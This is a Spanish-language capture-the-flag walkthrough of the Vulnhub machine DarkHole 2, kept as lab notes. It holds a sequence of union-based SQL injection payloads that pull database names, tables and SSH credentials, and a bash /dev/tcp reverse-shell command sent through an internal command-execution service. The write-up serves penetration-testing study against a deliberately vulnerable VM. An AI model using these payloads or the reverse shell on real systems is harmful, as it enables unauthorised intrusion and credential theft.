#ctf-machine #vulnhub #easy-machine #linux  [Vulnhub Link](https://www.vulnhub.com/entry/darkhole-2,740/)

## Enumeración inicial
Como no sabemos la dirección IPv4 de la máquina objetivo, primeramente realizamos un escaneo ARP con `arp-scan`:
![[Pasted image 20240825154225.png]]

Como el OUI de la MAC es "00:0c" podemos decir que la IPv4 de la máquina víctima es la "192.168.159.142", ya que las máquinas importadas en VMWare contienen el valor de OUI.

Si lanzamos una traza ICMP podemos decir que seguramente se trate de una máquina Linux dado su TTL=64, ya que por norma general las máquinas Linux suelen tener ese valor.
![[Pasted image 20240825154344.png]]


### Nmap
Si hacemos un primer escaneo con `nmap` para detectar los puertos TCP abiertos de la máquina podemos ver que hay 2 puertos abiertos, el 22 y el 80.
![[Pasted image 20240825154557.png]]

Si hacemos un segundo escaneo con `nmap` para detectar la versión y servicio que corren para estos dos puertos abiertos, podemos ver lo siguiente:
![[Pasted image 20240825154801.png]]

Como vemos se trata de un Ubuntu que en el puerto 22 corre el servicio "OpenSSH 8.2p1" y por el puerto 80 el servicio "Apache httpd 2.4.41". Además, vemos que `nmap` nos ha reportado que el servicio web contiene un repositorio "Git" la cual cosa es bastante crítico.

Hacemos un último escaneo con `nmap` para buscar directorios de la web con el script "http-enum":
![[Pasted image 20240825155133.png]]

Vemos que de momento hay estos directorios además de que tenemos capacidad de *directory listing*.


## Enumeración web
Como anteriormente hemos visto que hay accesible una carpeta ".git", utilizamos el repositorio "GitTools" para extraer si es posible, el proyecto que corre con "Apache2" y enumerar información crítica.

Primeramente, utilizamos la herramienta `gitdumper` para extraer el contenido de la carpeta ".git":
![[Pasted image 20240825160411.png]]

Seguidamente, utilizamos el `gitextractor` para obtener el proyecto con sus repectivos *commits*:
![[Pasted image 20240825160535.png]]

Una vez extraído podemos ver que se trata de 3 commits:
![[Pasted image 20240825160624.png]]

Si enumeramos los diferentes commits del proyecto podemos ver lo siguiente:
![[Pasted image 20240825160839.png]]

Por lo que si accedemos al archivo `login.php` podemos obtener unas credenciales:
![[Pasted image 20240825160944.png]]

Además, si accedemos a `config.php` podemos ver las credenciales de acceso a la base de datos:
![[Pasted image 20240825161029.png]]

Si accedemos a la página web, podemos ver lo siguiente:
![[Pasted image 20240825161254.png]]

Por lo que si accedemos a `login.php`:
![[Pasted image 20240825161323.png]]

Y seguidamente intentamos loguearnos con las credenciales obtenidas, obtenemos acceso:
![[Pasted image 20240825161407.png]]

## SQL Injection
Si nos fijamos en la URL hay un parámetro "id" por lo que si probamos un SQL *Injection* funciona:
![[Pasted image 20240825170309.png]]

Por lo que primeramente buscamos el número de columnas de esta query con:
```
1' order by X-- -   
```

Donde X son valores altos que vamos reduciendo hasta encontrar el valor que muestra contenido que en este caso ha sido 6. Seguidamente, formulamos queries para detectar los campos de texto utilizando un valor id inválido como el 0 y la instrucción "union select" seguida de 6 NULL's:
```
0' union select NULL,NULL,NULL,NULL,NULL,NULL-- -
```

Y vamos cambiando los valores de "NULL" de uno en uno por caracteres hasta ver los valores en la respuesta. En este caso el segundo campo es de texto y muestra contenido en la respuesta:
```
0' union select NULL,'a',NULL,NULL,NULL,NULL-- -
```
![[Pasted image 20240825171845.png]]

Por lo que ya podemos ver por ejemplo el nombre de la base de datos:
```
0' union select NULL,database(),NULL,NULL,NULL,NULL-- -
```
![[Pasted image 20240825171939.png]]

Y listar todas las bases de datos disponibles:
```
0' union select NULL,group_concat(schema_name),NULL,NULL,NULL,NULL from information_schema.schemata-- -
```
![[Pasted image 20240825172213.png]]

En este caso solo hay una interesante, la base de datos "darkhole_2". Por lo que podemos listar sus tablas con:
```
0' union select NULL,group_concat(table_name),NULL,NULL,NULL,NULL from information_schema.tables where table_schema = 'darkhole_2'-- -
```
![[Pasted image 20240825172336.png]]

Seguidamente, mostramos las columnas de la tabla "ssh" con:
```
0' union select NULL,group_concat(column_name),NULL,NULL,NULL,NULL from information_schema.columns where table_schema = 'darkhole_2' and table_name='ssh'-- -
```
![[Pasted image 20240825172455.png]]

Como se puede ver hay 2 columnas interesantes: "user" y "pass" por lo que extraemos la data de estas dos columnas con:
```
0' union select NULL,group_concat(user),group_concat(pass),NULL,NULL,NULL from ssh-- -
```
![[Pasted image 20240825172702.png]]

Como podemos ver hay un usuario "jehad" con su contraseña "fool". 

Por lo que ya nos podemos conectar a la máquina mediante SSH en caso de que sean válidas las credenciales:
![[Pasted image 20240825172838.png]]

Como vemos estamos dentro de la máquina víctima.

## Escalada de privilegios
Si accedemos al "home" del usuario "jehad" y mostramos el contenido del archivo `.bash_history` podemos ver algunos comando algo extraños:
![[Pasted image 20240825175331.png]]

Si listamos los puertos internos abiertos de la máquina podemos ver que efectivamente el puerto 9999 esta abierto:
![[Pasted image 20240825175414.png]]

Por lo que podemos probar de hacer un curl desde la máquina objetivo ya que es un puerto interno.
![[Pasted image 20240825175511.png]]

Como podemos ver, nos pide un parámetro "cmd", por lo que podemos probar de ejecutar el comando "whoami" para identificar el usuario que está ejecutando este servicio:
![[Pasted image 20240825175644.png]]

Como podemos ver lo está ejecutando el usuario "losy" por lo que podemos intentar ejecutar un comando que nos mande una *reverse shell* por el puerto 443:
```bash
bash -c "bash -i >& /dev/tcp/192.168.159.131/443 0>&1"
```
![[Pasted image 20240825180010.png]]
![[Pasted image 20240825180026.png]]

Por lo que hacemos el tratamiento de la TTY:
![[Pasted image 20240825180122.png]]
![[Pasted image 20240825180157.png]]

Si accedemos a `/home/losy` podemos visualizar la primera *flag*:
![[Pasted image 20240825180303.png]]

Si accedemos al contenido de `/home/losy/.bash_history` podemos ver una supuesta contraseña:
![[Pasted image 20240825180625.png]]

Si la probamos con el comando su para ver si es correcta, podemos ver que si:
![[Pasted image 20240825180740.png]]

Por lo que si listamos los permisos a nivel de *suoders* como se hace en el `/home/losy/.bash_history` vemos que tenemos permisos de ejecutar python3 como "root":
![[Pasted image 20240825180929.png]]

Por lo que podemos utilizar el mismo este *oneliner* para obtener acceso a la máquina como root:
![[Pasted image 20240825181051.png]]

Y si finalmente accedemos a `/root` podemos visualizar la última *flag*:
![[Pasted image 20240825181132.png]]

___
#information-leakage  #sqli #abusing-sudoers #git 
___